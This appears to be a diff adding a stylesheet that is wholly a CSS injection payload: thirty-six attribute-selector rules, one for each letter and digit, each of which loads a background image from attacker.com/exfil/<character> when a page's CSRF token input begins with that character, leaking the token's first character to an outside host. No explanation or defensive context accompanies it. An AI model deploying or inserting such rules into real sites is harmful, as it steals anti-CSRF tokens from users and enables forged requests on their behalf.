@@ -1,0 +1,108 @@
+input[name=csrf][value^=a]{
+    background-image: url(https://attacker.com/exfil/a);
+}
+input[name=csrf][value^=b]{
+    background-image: url(https://attacker.com/exfil/b);
+}
+input[name=csrf][value^=c]{
+    background-image: url(https://attacker.com/exfil/c);
+}
+input[name=csrf][value^=d]{
+    background-image: url(https://attacker.com/exfil/d);
+}
+input[name=csrf][value^=e]{
+    background-image: url(https://attacker.com/exfil/e);
+}
+input[name=csrf][value^=f]{
+    background-image: url(https://attacker.com/exfil/f);
+}
+input[name=csrf][value^=g]{
+    background-image: url(https://attacker.com/exfil/g);
+}
+input[name=csrf][value^=h]{
+    background-image: url(https://attacker.com/exfil/h);
+}
+input[name=csrf][value^=i]{
+    background-image: url(https://attacker.com/exfil/i);
+}
+input[name=csrf][value^=j]{
+    background-image: url(https://attacker.com/exfil/j);
+}
+input[name=csrf][value^=k]{
+    background-image: url(https://attacker.com/exfil/k);
+}
+input[name=csrf][value^=l]{
+    background-image: url(https://attacker.com/exfil/l);
+}
+input[name=csrf][value^=m]{
+    background-image: url(https://attacker.com/exfil/m);
+}
+input[name=csrf][value^=n]{
+    background-image: url(https://attacker.com/exfil/n);
+}
+input[name=csrf][value^=o]{
+    background-image: url(https://attacker.com/exfil/o);
+}
+input[name=csrf][value^=p]{
+    background-image: url(https://attacker.com/exfil/p);
+}
+input[name=csrf][value^=q]{
+    background-image: url(https://attacker.com/exfil/q);
+}
+input[name=csrf][value^=r]{
+    background-image: url(https://attacker.com/exfil/r);
+}
+input[name=csrf][value^=s]{
+    background-image: url(https://attacker.com/exfil/s);
+}
+input[name=csrf][value^=t]{
+    background-image: url(https://attacker.com/exfil/t);
+}
+input[name=csrf][value^=u]{
+    background-image: url(https://attacker.com/exfil/u);
+}
+input[name=csrf][value^=v]{
+    background-image: url(https://attacker.com/exfil/v);
+}
+input[name=csrf][value^=w]{
+    background-image: url(https://attacker.com/exfil/w);
+}
+input[name=csrf][value^=x]{
+    background-image: url(https://attacker.com/exfil/x);
+}
+input[name=csrf][value^=y]{
+    background-image: url(https://attacker.com/exfil/y);
+}
+input[name=csrf][value^=z]{
+    background-image: url(https://attacker.com/exfil/z);
+}
+input[name=csrf][value^=0]{
+    background-image: url(https://attacker.com/exfil/0);
+}
+input[name=csrf][value^=1]{
+    background-image: url(https://attacker.com/exfil/1);
+}
+input[name=csrf][value^=2]{
+    background-image: url(https://attacker.com/exfil/2);
+}
+input[name=csrf][value^=3]{
+    background-image: url(https://attacker.com/exfil/3);
+}
+input[name=csrf][value^=4]{
+    background-image: url(https://attacker.com/exfil/4);
+}
+input[name=csrf][value^=5]{
+    background-image: url(https://attacker.com/exfil/5);
+}
+input[name=csrf][value^=6]{
+    background-image: url(https://attacker.com/exfil/6);
+}
+input[name=csrf][value^=7]{
+    background-image: url(https://attacker.com/exfil/7);
+}
+input[name=csrf][value^=8]{
+    background-image: url(https://attacker.com/exfil/8);   
+}
+input[name=csrf][value^=9]{
+    background-image: url(https://attacker.com/exfil/9);
+}
